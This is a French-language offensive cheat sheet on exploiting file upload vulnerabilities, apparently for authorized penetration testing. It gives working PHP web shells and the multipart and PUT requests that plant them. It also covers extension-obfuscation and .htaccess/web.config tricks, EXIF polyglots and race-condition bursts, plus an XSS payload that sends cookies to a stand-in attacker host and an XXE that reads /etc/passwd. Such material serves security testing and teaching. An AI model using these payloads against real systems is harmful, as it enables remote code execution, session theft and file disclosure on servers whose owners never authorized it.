# File Upload — Cheat sheet

## 1. Périmètre et conventions

Cette fiche couvre l'exploitation offensive des **vulnérabilités d'upload de fichiers**, c'est-à-dire les cas où le serveur **n'inspecte pas suffisamment** le nom, le type déclaré, le contenu binaire ou la taille d'un fichier téléversé. Familles de techniques couvertes :

- **Contournement du `Content-Type` déclaré** (validation côté client, entièrement falsifiable).
- **Contournement de listes noires d'extensions** (extensions alternatives, obfuscation de nom, détournement de fichiers de configuration `.htaccess`/`web.config`).
- **Contournement de la validation de contenu** (magic bytes, dimensions d'image, fichiers polyglottes via métadonnées EXIF).
- **Race conditions** entre écriture temporaire et validation/déplacement du fichier.
- **Exploitation sans RCE** : Stored XSS (HTML/SVG) et XXE (DOCX/XLSX/SVG).
- **Dépôt direct via la méthode HTTP `PUT`**.

Cette fiche ne couvre pas : l'exploitation approfondie d'une XXE confirmée (exfiltration OOB) — voir une fiche XXE dédiée ; le détail des scanners antivirus/heuristiques intervenant en sandbox, non décrits techniquement dans le cours source. La démarche complète pas-à-pas (arbre de décision, diagnostic étape par étape) relève de la fiche de méthodologie d'exploitation dédiée, pas de cette cheat sheet.

**Outils cités :** `curl`, Burp Suite (Repeater, Turbo Intruder), `identify` (ImageMagick), `exiftool`, `xxd`.

**Conventions utilisées :**

| Valeur fictive | Signification |
|---|---|
| `cible.com` | Nom d'hôte fictif — remplacer par la cible réellement autorisée |
| `shell.php`, `shell.xyz`, `polyglotte.jpg` | Noms de fichiers illustratifs — adapter au contexte de l'application auditée |
| `cmd`, `command` | Paramètre GET contrôlant l'exécution dans le web shell — à adapter au payload réellement déposé |
| `/uploads/` | Chemin de stockage illustratif — à confirmer via la réponse d'upload ou une convention observée |

Toute syntaxe de contournement présentée dépend fortement du serveur web (Apache/Nginx/IIS), de sa version, du langage backend et de sa configuration — aucune n'est universelle. Un payload accepté à l'upload ne constitue jamais, à lui seul, une preuve d'exécution : voir section 8.

---

## 2. Tableau de repérage rapide

| Objectif | Technique ou syntaxe | Quand l'utiliser | Signal attendu | Limite principale |
|---|---|---|---|---|
| Détecter une validation basée sur le seul `Content-Type` | Falsifier le `Content-Type` déclaré d'un fichier `.php` en `image/jpeg` | Première chose à tester sur tout formulaire d'upload | Upload accepté sans message de refus | Ne prouve pas l'exécution — juste le contournement de cette couche précise |
| Contourner une liste noire d'extensions | Extensions alternatives (`.phtml`, `.pht`, `.shtml`, variantes ASP/JSP) | L'extension `.php` brute est rejetée | Une variante est acceptée sans refus | Acceptation ≠ interprétation par le serveur |
| Contourner une liste noire par obfuscation de nom | Casse, extension multiple, caractères de fin, encodage URL, null byte | Le nom de fichier est filtré par comparaison de chaîne stricte | Variante acceptée là où la forme canonique est rejetée | Dépend fortement de la stack serveur et de sa version |
| Redéfinir la politique d'exécution d'un répertoire | Upload de `.htaccess` (Apache) ou `web.config` (IIS) | Toutes les extensions directes/obfusquées sont bloquées | Fichier de config accepté, extension triviale ensuite interprétée | Inefficace si `AllowOverride None` ou équivalent |
| Contourner une validation de contenu (dimensions/magic bytes) | Fichier polyglotte (payload dans métadonnées EXIF) | Un script brut est rejeté par une vérification de structure d'image | Le polyglotte est accepté là où le script brut est rejeté | Primitive de dépôt seule — nécessite un vecteur d'interprétation séparé |
| Exploiter une fenêtre de traitement en deux temps | Rafale de requêtes GET pendant l'upload (race condition) | Architecture avec sandbox temporaire + validation asynchrone suspectée | Une requête de la rafale retourne le résultat exécuté | Fenêtre souvent de l'ordre de la milliseconde, résultat parfois non reproductible |
| Confirmer l'exécution de code (preuve d'impact) | Requête GET sur le chemin du fichier déposé | Après tout dépôt réussi d'un payload d'exécution | Résultat de la commande système dans la réponse | Code source affiché en clair = divulgation, pas RCE |
| Obtenir un impact sans RCE | Upload HTML/SVG (XSS) ou DOCX/XLSX/SVG avec entité externe (XXE) | Les vecteurs RCE échouent mais ces formats sont acceptés | Exécution du script au chargement direct / contenu système dans la réponse du traitement | Neutralisé par `Content-Disposition: attachment`, domaine séparé, ou absence de parsing XML réel |
| Déposer un fichier hors formulaire classique | Requête `PUT` directe sur un chemin de fichier | La méthode `PUT` est listée dans l'en-tête `Allow` | Fichier déposé accessible et interprété | `PUT` activé au niveau serveur ≠ absence de contrôle d'autorisation applicatif |

---

## 3. Techniques classées par objectif

### 3.1 Détecter — Révéler la nature de la validation appliquée

#### Falsification du `Content-Type` déclaré

**Objectif :** établir si la validation du type de fichier repose uniquement sur l'en-tête `Content-Type` de la partie multipart, sans inspection du contenu réel.

**Quand l'utiliser :** en tout premier test sur toute fonctionnalité d'upload.

**Prérequis :** fonctionnalité d'upload accessible en `multipart/form-data` ; comportement de référence (upload légitime) déjà observé.

**Syntaxe minimale :**

```http
POST /upload HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ
Content-Length: 312

------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryXYZ--
```

**Éléments à personnaliser :** le `boundary`, le nom du champ (`name="file"`), le `filename`, le payload PHP.

**Signal attendu :** réponse d'upload sans message de refus, chemin ou URL de fichier retourné.

**Interprétation :** une acceptation démontre que cette couche de validation précise (MIME déclaré) ne bloque rien — reste à vérifier si le serveur interprète réellement l'extension `.php` (section 3.3). Un refus ne prouve pas l'absence de vulnérabilité : il indique seulement que le filtrage ne repose pas (uniquement) sur cette valeur.

**Limites :** le `Content-Type` est une donnée **entièrement contrôlée par le client** — une validation reposant dessus seul est structurellement faible, mais sa présence ou son absence ne dit rien des autres couches de validation (nom, contenu).

**Source :** cours de référence, §3.B.

### 3.2 Contourner une contrainte identifiée — Listes noires d'extensions

#### Extensions alternatives

**Objectif :** exploiter l'incomplétude structurelle d'une liste noire d'extensions dangereuses.

**Quand l'utiliser :** l'extension `.php` (ou équivalent) brute est explicitement rejetée.

**Prérequis :** connaître ou deviner la stack serveur cible, pour cibler des variantes pertinentes.

**Syntaxe minimale (noms de fichiers à tester) :**

```text
shell.php5
shell.php7
shell.phtml
shell.pht
shell.shtml
shell.asa
shell.cer
shell.asax
shell.jsp
shell.jspx
shell.jsw
shell.jsv
```

**Éléments à personnaliser :** le nom de base (`shell`), le choix de la famille d'extensions selon la stack identifiée (PHP vs ASP/ASP.NET vs Java).

**Signal attendu :** acceptation sans message de refus pour au moins une variante là où `.php` est bloqué.

**Interprétation :** l'acceptation révèle une liste noire incomplète — reste à confirmer que le handler serveur interprète effectivement cette extension dans le répertoire de destination (section 3.5), l'acceptation à l'upload n'étant pas une preuve d'exécution.

**Limites :** la pertinence de chaque extension dépend strictement du serveur web et de sa configuration (ex. `.shtml` n'a de sens que si le module SSI Apache est actif).

**Source :** cours de référence, §3.C.

#### Obfuscation du nom de fichier

**Objectif :** contourner un filtre basé sur une comparaison de chaîne stricte ou non récursive de l'extension.

**Quand l'utiliser :** les extensions alternatives directes sont elles aussi rejetées, mais le message d'erreur suggère une comparaison de chaîne plutôt qu'une liste blanche stricte.

**Prérequis :** connaître le système de fichiers/serveur cible (sensibilité à la casse, gestion des caractères de fin, version PHP pour le null byte).

**Syntaxe minimale (variantes à tester) :**

```text
shell.pHp              # variation de casse
shell.php.jpg          # extension multiple (double extension)
"shell.php "           # espace final
shell.php.             # point final
shell%2Ephp            # encodage URL du point (%2E = .)
shell.php%00.jpg       # null byte (environnements PHP anciens)
shell.php;.jpg         # point-virgule (certains serveurs Java/Tomcat)
shell.p.phphp          # nettoyage non récursif de la sous-chaîne "php"
```

**Éléments à personnaliser :** chacune des variantes repose sur un mécanisme différent — tester une catégorie à la fois pour isoler celle qui fonctionne.

**Signal attendu :** acceptation d'au moins une variante là où la forme canonique est rejetée.

**Interprétation :** chaque variante exploite un mécanisme distinct (voir §5) ; une acceptation isolée ne dit rien des autres catégories non testées. Comme pour les extensions alternatives, l'acceptation seule ne prouve pas l'exécution.

**Limites :** ces techniques dépendent fortement de versions logicielles précises (ex. le null byte ne fonctionne que sur PHP < 5.3.4) et ne sont donc pas applicables de façon universelle.

**Source :** cours de référence, §3.C.

#### Détournement de fichiers de configuration (`.htaccess` / `web.config`)

**Objectif :** redéfinir la politique d'exécution du répertoire d'upload lui-même, indépendamment de toute liste noire applicative sur les extensions.

**Quand l'utiliser :** les extensions dangereuses directes et leurs variantes obfusquées sont toutes bloquées.

**Prérequis :** serveur identifié comme Apache (pour `.htaccess`, nécessite `AllowOverride` actif) ou IIS (pour `web.config`) ; le nom de fichier `.htaccess`/`web.config` ne doit pas être explicitement bloqué.

**Syntaxe minimale (Apache) :**

```apache
AddType application/x-httpd-php .xyz
```

```bash
curl -F "file=@.htaccess" https://cible.com/upload
curl -F "file=@shell.xyz" https://cible.com/upload
curl "https://cible.com/uploads/shell.xyz?cmd=id"
```

**Syntaxe minimale (IIS) :**

```xml
<configuration>
  <system.webServer>
    <handlers>
      <add name="xyz_as_php" path="*.xyz" verb="*"
           modules="FastCgiModule"
           scriptProcessor="C:\PHP\php-cgi.exe"
           resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

**Éléments à personnaliser :** l'extension triviale choisie (`.xyz`), le chemin du fichier `shell.xyz`, le paramètre d'exécution (`cmd`).

**Signal attendu :** acceptation du fichier de configuration, puis réponse contenant le résultat d'une commande lors de l'accès au fichier à extension triviale.

**Interprétation :** l'acceptation du fichier de configuration seule ne prouve rien — c'est l'exécution effective sur l'extension triviale qui confirme le contournement (section 3.5). Un rejet explicite par nom indique une protection délibérée contre ce vecteur ; une acceptation sans effet sur l'extension triviale évoque une configuration serveur désactivant la prise en compte de ces fichiers locaux (ex. `AllowOverride None`).

**Limites :** technique propre à Apache/IIS ; sans effet si le serveur ignore ces fichiers de configuration locaux.

**Source :** cours de référence, §3.C.

### 3.3 Contourner une contrainte identifiée — Validation de contenu

#### Fichier polyglotte (métadonnées EXIF)

**Objectif :** satisfaire une validation de structure/dimensions d'image tout en embarquant un payload exploitable.

**Quand l'utiliser :** un script brut est rejeté par une vérification de type image (ex. extraction de dimensions échouée), suggérant une validation de contenu au-delà du nom/MIME déclaré.

**Prérequis :** disposer d'une image valide pouvant recevoir des métadonnées EXIF (format JPEG typiquement) ; `exiftool` installé.

**Syntaxe minimale :**

```bash
identify shell.php
# identify: no decode delegate for this image format
```

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image_valide.jpg -o polyglotte.jpg
exiftool polyglotte.jpg | grep -i comment
```

**Éléments à personnaliser :** l'image source (`image_valide.jpg`), le champ EXIF utilisé (`Comment` est un exemple — d'autres champs sont possibles), le payload injecté.

**Signal attendu :** acceptation de `polyglotte.jpg` à l'upload là où le script PHP brut était rejeté.

**Interprétation :** l'acceptation démontre que la validation porte sur la structure/signature de l'image mais pas sur l'absence de données additionnelles exploitables — c'est une **primitive de dépôt**, pas une preuve d'exécution : le fichier reste stocké avec une extension image, non interprétée par défaut. Un vecteur d'interprétation séparé (détournement de configuration, LFI externe) est nécessaire pour l'exploiter.

**Limites :** inefficace si l'application re-compresse/reconstruit l'image côté serveur (ce qui détruit les métadonnées) — comportement non détaillé dans le cours source mais à anticiper.

**Source :** cours de référence, §3.D.

### 3.4 Provoquer un effet contrôlé — Race conditions

#### Exploitation par tir en rafale

**Objectif :** accéder à un fichier malveillant pendant la fenêtre où il est écrit temporairement mais pas encore validé/déplacé ou supprimé.

**Quand l'utiliser :** l'architecture traite apparemment l'upload en deux temps (délai observable, mention d'un scan antivirus ou d'une validation asynchrone) et un chemin prévisible existe pour le fichier.

**Prérequis :** outil permettant un contrôle fin du timing et l'envoi d'un volume élevé de requêtes (Turbo Intruder sous Burp Suite) ; chemin du fichier temporaire ou final prévisible.

**Syntaxe minimale (principe) :**

```text
1. Requête A : upload du web shell malveillant
2. Requête B (rafale, quasi simultanée) : GET sur le chemin prévisible du fichier
3. Répétition à très haute fréquence pour maximiser la probabilité de "gagner la course"
```

**Éléments à personnaliser :** le chemin cible de la requête B, la fréquence/volume de la rafale, le payload uploadé en requête A.

**Signal attendu :** au moins une requête de la rafale retourne le résultat de l'exécution du payload, avant qu'une suppression ou un déplacement ne rende les suivantes infructueuses.

**Interprétation :** un échec après une seule tentative ne permet pas de conclure à l'absence de fenêtre — celle-ci peut être de l'ordre de la milliseconde. Un échec répété malgré un volume élevé de requêtes est un signal plus fiable d'une opération atomique côté serveur.

**Limites :** résultat potentiellement non reproductible d'un essai à l'autre ; nécessite un volume de requêtes suffisant pour conclure de façon fiable.

**Source :** cours de référence, §3.E.

**Variante — upload par URL distante :**

**Objectif :** élargir artificiellement la fenêtre de course lorsque le serveur télécharge lui-même le fichier depuis une URL fournie.

**Syntaxe minimale (principe) :** héberger le fichier malveillant précédé d'un **padding** important (données inutiles ajoutées en tête) pour ralentir le téléchargement effectué par le serveur distant.

**Interprétation :** le padding retarde volontairement la fin du téléchargement côté serveur, élargissant la fenêtre d'opportunité disponible pour la rafale de requêtes B ci-dessus.

**Source :** cours de référence, §3.E.

### 3.5 Confirmer / Récupérer une preuve — Exécution effective

#### Vérification de l'exécution du fichier déposé

**Objectif :** établir que le fichier déposé est réellement interprété par le serveur, et non simplement stocké ou affiché en clair.

**Quand l'utiliser :** systématiquement après tout dépôt réussi d'un payload d'exécution, quelle que soit la technique de contournement utilisée en amont.

**Prérequis :** chemin du fichier déposé connu (retourné par la réponse d'upload, ou déduit d'une convention observée).

**Syntaxe minimale :**

```bash
curl "https://cible.com/uploads/shell.php?cmd=id"
```

**Éléments à personnaliser :** le chemin du fichier, le nom du paramètre GET (dépend du payload réellement déposé — voir variantes ci-dessous), la commande testée.

**Signal attendu :** le résultat de la commande système (`uid=...` pour `id`) apparaît dans le corps de la réponse.

**Interprétation :**

| Observation | Signification |
|---|---|
| Résultat de commande affiché | Exécution confirmée (web shell fonctionnel) |
| Code source PHP affiché en clair | Handler non configuré sur cette extension/ce répertoire — **divulgation de code source**, pas RCE |
| Erreur 404/500 | Chemin de stockage probablement incorrect |
| Réponse vide sans erreur | Fonction d'exécution utilisée potentiellement désactivée (`disable_functions`) |

**Limites :** une divulgation de code source ne doit jamais être présentée comme une RCE — ce sont deux niveaux d'impact distincts nécessitant des preuves différentes (section 8).

**Source :** cours de référence, §3.A ; §2.3–2.4.

---

## 4. Payloads et syntaxes représentatifs

### Web shells PHP minimalistes

| Payload | Ce qu'il teste/produit | Contexte d'insertion | Différence utile | Limite |
|---|---|---|---|---|
| `<?php echo file_get_contents('/path/to/file'); ?>` | Lecture arbitraire d'un fichier connu | Corps du fichier uploadé avec extension interprétée | Payload minimal, sans interaction utilisateur | Cible fixe — nécessite de modifier le code pour chaque fichier à lire |
| `<?php echo system($_GET['command']); ?>` | Exécution de commande système via paramètre GET | Corps du fichier uploadé | Permet de varier la commande sans re-déposer le fichier | `system()` peut être désactivée via `disable_functions` |
| `<?php if (isset($_GET['cmd'])) { echo shell_exec($_GET['cmd']); } ?>` | Alternative à `system()` si celle-ci est désactivée | Corps du fichier uploadé | Utilise `shell_exec()` à la place de `system()` | Peut elle aussi être désactivée — tester plusieurs fonctions si l'une échoue |

Ces trois payloads sont des variantes d'une même intention (exécution de commande) ; la deuxième et la troisième ne diffèrent que par la fonction PHP employée, pertinent uniquement en cas de restrictions `disable_functions` côté serveur.

### Formats sans RCE (XSS / XXE)

| Payload | Ce qu'il teste | Contexte | Différence utile | Limite |
|---|---|---|---|---|
| `<script>document.location='https://attaquant.com/steal?cookie='+document.cookie;</script>` dans un fichier `.html` | Stored XSS via fichier HTML servi directement | Fichier HTML uploadé, consulté directement par un navigateur | Classique, nécessite que le fichier soit servi sans forçage de téléchargement | Sans effet si `Content-Disposition: attachment` est appliqué ou si servi depuis un domaine séparé |
| `<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"></svg>` | Stored XSS via fichier SVG (image ET document XML exécutable) | Fichier SVG uploadé et servi directement | Exploite la double nature SVG (image + JS) sans dépendre d'une extension `.html` | Mêmes limites que le XSS HTML |
| `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>` | XXE via document structuré (DOCX/XLSX/SVG) | Inséré dans `document.xml` d'une archive DOCX/XLSX, ou directement dans un SVG | Cible un parseur XML traitant réellement le document (miniature, extraction) | Sans effet si la résolution d'entités externes est désactivée, ou si le document n'est pas traité par un parseur XML |

Aucune variante supplémentaire n'est ajoutée au-delà de celles documentées dans le cours — l'objectif XSS/XXE reste de démontrer un impact exploitable **indépendamment** de toute faille d'exécution serveur.

---

## 5. Encodages, formats et représentation des entrées

| Transformation | Origine | Transformée | Contexte pertinent | Composant décodeur visé | Effet attendu |
|---|---|---|---|---|---|
| Encodage URL du point | `.` | `%2E` (ex. `shell%2Ephp`) | Nom de fichier soumis dans `Content-Disposition` d'une requête multipart | Le filtre applicatif analyse la chaîne **avant** décodage, le système de fichiers reçoit la version **décodée** | Le filtre voit un nom sans extension `.php` reconnaissable, le système de fichiers stocke bien `shell.php` |
| Troncature par octet nul | fin de nom | `.asp%00.jpg` | Nom de fichier, environnements anciens (PHP < 5.3.4, certains serveurs Java/Tomcat) | Le runtime tronque le nom à l'octet nul lors du traitement final | Le filtre valide `.jpg`, mais le fichier est effectivement stocké/traité comme `.asp` |
| Point-virgule de troncature | fin d'extension | `.asp;.jpg` | Nom de fichier, certains serveurs Java/Tomcat historiques | Le serveur ignore tout ce qui suit le `;` lors de la résolution d'extension | Comportement similaire au null byte, propre à certaines piles Java |
| Caractères de fin superflus | extension | `.php.`, `.php ` (espace final) | Nom de fichier | Certains systèmes de fichiers/serveurs ignorent silencieusement le caractère final à l'exécution, tout en le conservant pour la validation du filtre | Le filtre voit une extension non reconnue, le serveur interprète néanmoins `.php` |
| Variation de casse | `.php` | `.pHp`, `.PHP` | Nom de fichier | Un filtre comparant en minuscules strictes (`== ".php"`) laisse passer les variantes si le handler serveur est, lui, insensible à la casse | Contournement d'un filtre sensible à la casse sur un serveur qui ne l'est pas |
| Double extension | `.php` | `.php.jpg` | Nom de fichier | Un filtre qui ne vérifie que l'extension **finale** accepte le fichier ; certains serveurs mal configurés interprètent la **première** extension reconnue | Contournement d'un filtre vérifiant uniquement la dernière extension |

Ces transformations ne sont pertinentes que dans la mesure où **le filtre applicatif et le composant d'exécution traitent la chaîne différemment** (avant/après décodage, premier/dernier élément, sensibilité à la casse). Sans cette divergence de traitement, elles sont inopérantes — ne pas les multiplier sans hypothèse précise sur le composant visé.

---

## 6. Exemples de requêtes HTTP

### 6.1 Upload légitime vs falsification du `Content-Type`

**Référence (upload légitime, image réelle) :**
```http
POST /upload HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ
Content-Length: 298

------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="file"; filename="avatar.jpg"
Content-Type: image/jpeg

[octets JPEG valides]
------WebKitFormBoundaryXYZ--
```

**Modifiée :**
```http
POST /upload HTTP/1.1
Host: cible.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXYZ
Content-Length: 312

------WebKitFormBoundaryXYZ
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryXYZ--
```

- Changement : `filename` passe de `avatar.jpg` à `shell.php`, le corps du fichier devient un payload PHP ; le `Content-Type` déclaré (`image/jpeg`) reste inchangé.
- Pourquoi : isole si la validation repose sur le `Content-Type` déclaré plutôt que sur le contenu réel ou l'extension.
- Prérequis : avoir d'abord observé une requête légitime pour connaître le format attendu (nom de champ, boundary).
- Signal à rechercher : absence de message de refus, chemin de fichier retourné dans la réponse.
- Ce que cela ne prouve pas à lui seul : que le fichier est exécutable — seule une requête GET ultérieure sur le chemin déposé (§6.3) peut le confirmer.

### 6.2 Découverte et exploitation de la méthode `PUT`

**Référence :**
```http
OPTIONS /uploads/ HTTP/1.1
Host: cible.com
```

**Réponse à examiner :**
```http
HTTP/1.1 200 OK
Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
```

**Modifiée (exploitation) :**
```http
PUT /uploads/shell.php HTTP/1.1
Host: cible.com
Content-Type: application/x-httpd-php
Content-Length: 41

<?php system($_GET['cmd']); ?>
```

- Changement : méthode `GET`/`OPTIONS` → `PUT` ; corps de requête contenant directement le payload, sans encapsulation multipart.
- Pourquoi : `PUT` permet de déposer un fichier directement à une URL choisie, sans passer par le formulaire d'upload et ses éventuelles validations applicatives.
- Prérequis : `PUT` doit figurer dans l'en-tête `Allow` de la réponse `OPTIONS`.
- Signal à rechercher : code de réponse de succès (`201`/`204`), puis accessibilité et exécution du fichier à l'URL correspondante.
- Ce que cela ne prouve pas à lui seul : la présence de `PUT` dans `Allow` indique seulement que la méthode est activée au niveau serveur — pas qu'elle est exploitable sans autorisation applicative distincte.

---

## 7. Outils et commandes

| Outil | Fonction | Quand l'utiliser | Exemple minimal | Limite ou précaution |
|---|---|---|---|---|
| `curl` | Envoi de requêtes multipart, `PUT`, `OPTIONS` manuelles | Tests rapides, scripts de reconnaissance ou d'exploitation | `curl -F "file=@shell.xyz" https://cible.com/upload` | Ne reproduit pas toujours fidèlement un boundary/en-tête personnalisé sans options explicites |
| Burp Suite (Repeater) | Modification manuelle du `Content-Type`, du nom de fichier, des en-têtes multipart | Dès qu'un test nécessite un ajustement fin et itératif d'une requête d'upload | Intercepter l'upload légitime, modifier `filename`/`Content-Type`, renvoyer | Nécessite de bien comprendre la structure multipart avant modification |
| Turbo Intruder (extension Burp) | Envoi de requêtes en rafale avec contrôle fin du timing | Exploitation d'une race condition (fenêtre souvent de l'ordre de la milliseconde) | Script Turbo Intruder envoyant upload + rafale de GET quasi simultanés | Nécessite un volume de requêtes suffisant pour conclure de façon fiable à un échec |
| `identify` (ImageMagick) | Vérification qu'un fichier est une image structurellement valide | Confirmer qu'un script PHP brut est rejeté par une validation de dimensions | `identify shell.php` | Outil d'audit côté testeur — ne reflète pas nécessairement la bibliothèque utilisée côté serveur (GD, Pillow, etc.) |
| `exiftool` | Lecture/écriture de métadonnées EXIF | Construction d'un fichier polyglotte (payload dans un champ EXIF) | `exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o polyglotte.jpg` | Le champ EXIF utilisé doit être conservé par l'application (pas de re-compression côté serveur) |
| `xxd` | Inspection des premiers octets d'un fichier (magic bytes) | Vérifier la signature binaire réelle d'un fichier avant/après manipulation | `xxd -l 16 fichier_suspect.jpg` | Outil de diagnostic côté testeur, ne modifie rien côté serveur |

---

## 8. Signaux caractéristiques et vérifications

| Observation | Ce qu'elle peut indiquer | Vérification complémentaire | Conclusion à éviter |
|---|---|---|---|
| Upload accepté malgré un `Content-Type` falsifié | Validation reposant uniquement sur le MIME déclaré | Tenter l'exécution effective du fichier déposé (requête GET) | Que le fichier est exécutable — l'acceptation seule ne le prouve pas |
| Message d'erreur mentionnant explicitement une extension bloquée | Filtrage par liste noire (donc potentiellement incomplète) | Tester les extensions alternatives et variantes d'obfuscation (§3.2) | Qu'un refus sur `.php` signifie l'absence de toute vulnérabilité d'extension |
| Fichier de configuration (`.htaccess`/`web.config`) accepté | Absence de protection spécifique sur ces noms de fichiers | Confirmer l'effet réel sur une extension triviale après dépôt | Qu'une simple acceptation du fichier de configuration suffit sans tester son effet |
| Fichier polyglotte accepté là où un script brut est rejeté | Validation de contenu limitée à la structure/signature, sans inspection des métadonnées | Chercher un vecteur d'interprétation (détournement de configuration, LFI externe) | Que l'acceptation du polyglotte constitue à elle seule une RCE |
| Résultat de commande système dans la réponse HTTP | Exécution de code confirmée | Varier la commande injectée (`id`, puis `whoami`) pour exclure un contenu statique | Qu'un résultat obtenu une seule fois, non revérifié, est définitivement acquis |
| Code source PHP affiché en clair au lieu d'un résultat de commande | Handler non configuré sur cette extension/ce répertoire — divulgation de code source | Tester une extension alternative (§3.2) sur le même répertoire | Que cela constitue une RCE — c'est un impact distinct, moindre |
| Requête de rafale retournant le résultat exécuté avant suppression | Fenêtre de race condition exploitable | Répéter le test pour confirmer la reproductibilité | Qu'un seul succès isolé garantit une exploitation fiable et répétable |

---

## 9. Variantes de syntaxe et adaptation

| Variante | Problème qu'elle vise à résoudre | Changement par rapport à la référence | Nouveau signal attendu | Ce qu'il faut garder identique |
|---|---|---|---|---|
| `shell.phtml`/`shell.pht` au lieu de `shell.php` | La liste noire bloque `.php` mais pas ses variantes historiques | Seule l'extension change | Acceptation là où `.php` est bloqué | Le `Content-Type` déclaré et le corps du payload, pour isoler l'effet de l'extension seule |
| `shell.pHp` au lieu de `shell.php` | Le filtre compare la chaîne en minuscules strictes | Seule la casse de l'extension change | Acceptation là où la casse canonique est bloquée | Tout le reste du nom et du payload identique |
| `shell.php.jpg` au lieu de `shell.php` | Le filtre ne vérifie que l'extension finale | Ajout d'une seconde extension après `.php` | Acceptation, puis vérifier si le serveur interprète la première ou la dernière extension | Le payload PHP inchangé, pour vérifier précisément quelle extension est retenue à l'exécution |
| `shell%2Ephp` au lieu de `shell.php` | Le filtre analyse la chaîne avant décodage URL | Le point est remplacé par son équivalent encodé | Acceptation côté filtre, stockage sous `shell.php` décodé | Le payload et le `Content-Type`, pour isoler l'effet du seul encodage |
| `.htaccess`/`web.config` au lieu d'un nom avec extension dangereuse | Toutes les variantes d'extension sont bloquées | Changement complet de stratégie : cibler la configuration du répertoire plutôt que l'extension du payload | Acceptation du fichier de configuration, puis effet sur une extension triviale ensuite déposée | Le serveur cible identifié (Apache vs IIS) doit rester cohérent avec le type de fichier de configuration choisi |

**Règle importante :** ne jamais modifier simultanément l'extension, le `Content-Type` et le contenu du fichier dans un même essai — isoler une seule variable permet de savoir précisément quelle couche de validation a été contournée.

---

## 10. Diagnostic rapide des erreurs

| Problème constaté | Causes possibles | Vérification à effectuer | Ajustement pertinent | Ce que cela permet de conclure |
|---|---|---|---|---|
| Aucun changement observable quelle que soit l'extension testée | Liste blanche stricte en place | Comparer les messages d'erreur entre plusieurs extensions distinctes (générique vs spécifique) | Passer à la validation de contenu (fichier polyglotte, §3.3) plutôt que multiplier les extensions | Le filtrage par extension est robuste sur ce point précis — ne pas généraliser à la validation de contenu |
| Fichier accepté mais requête GET directe renvoie une 404 | Renommage aléatoire du fichier (UUID/hash), chemin non déterminable | Comparer le nom retourné dans la réponse d'upload avec le nom original soumis | Chercher une autre fonctionnalité exposant le chemin réel (liste de fichiers, profil) | Le renommage est un contrôle efficace sur ce point précis, indépendamment du reste |
| Fichier `.php` accessible mais code source affiché en clair | Handler non configuré sur cette extension dans ce répertoire précis | Tester le même payload avec une extension alternative (§3.2) | Basculer vers les extensions alternatives ou le détournement de configuration | Divulgation de code source confirmée, pas de RCE sur cette extension dans ce répertoire |
| Polyglotte accepté mais aucune exécution possible | Absence de vecteur d'interprétation disponible (pas de `.htaccess` accepté, pas de LFI) | Vérifier séparément si une LFI existe par ailleurs dans l'application | Tester le détournement de configuration comme vecteur alternatif | Primitive de dépôt confirmée, impact non démontré sans chaînage supplémentaire |
| Rafale de requêtes sans succès sur une race condition suspectée | Fenêtre trop étroite pour le volume envoyé, ou opération réellement atomique | Augmenter significativement le volume/fréquence avant de conclure | Répéter avec un outil à contrôle de timing fin, sur un nombre de tentatives nettement supérieur | Si toujours négatif après volume élevé, l'opération est probablement atomique — ne pas conclure après un seul essai |
| `PUT` listé dans `Allow` mais requête refusée | Autorisation applicative distincte de l'activation de la méthode au niveau serveur | Comparer le code de réponse (401/403 vs 404/405) | Tester avec une authentification valide si disponible dans le périmètre du test | La méthode est activée au niveau serveur mais protégée applicativement — pas un vecteur ouvert |

---

## 11. Checklist d'utilisation

- [ ] L'objectif du test est clairement identifié (contournement MIME, extension, contenu, race condition, XSS/XXE, ou `PUT`).
- [ ] Le comportement de référence de l'upload légitime a été observé avant toute modification.
- [ ] Les prérequis de la technique sont réunis ou explicitement vérifiés (serveur identifié pour `.htaccess`/`web.config`, chemin prévisible pour une race condition).
- [ ] Le bon emplacement du payload est identifié (nom de fichier, `Content-Type` déclaré, corps du fichier, métadonnées EXIF).
- [ ] Un exemple minimal a été privilégié avant d'ajouter des variantes.
- [ ] Le signal attendu est défini avant l'envoi du test.
- [ ] Une seule variable est modifiée par essai (extension, `Content-Type`, contenu).
- [ ] L'exécution effective du fichier déposé a été vérifiée par une requête GET distincte, et non supposée à partir de la seule acceptation de l'upload.
- [ ] Le niveau de preuve atteint est explicitement qualifié (dépôt accepté / contournement de validation / exécution confirmée).
- [ ] Les vecteurs sans RCE (XSS, XXE) sont envisagés si les formats correspondants sont acceptés, même en cas d'échec des vecteurs RCE.

---

## 12. Sources et liens de référence

- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [PortSwigger Web Security Academy — File upload vulnerabilities](https://portswigger.net/web-security/file-upload)
- [MITRE CWE-434 : Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
- [MITRE CWE-611 : Improper Restriction of XML External Entity Reference](https://cwe.mitre.org/data/definitions/611.html)
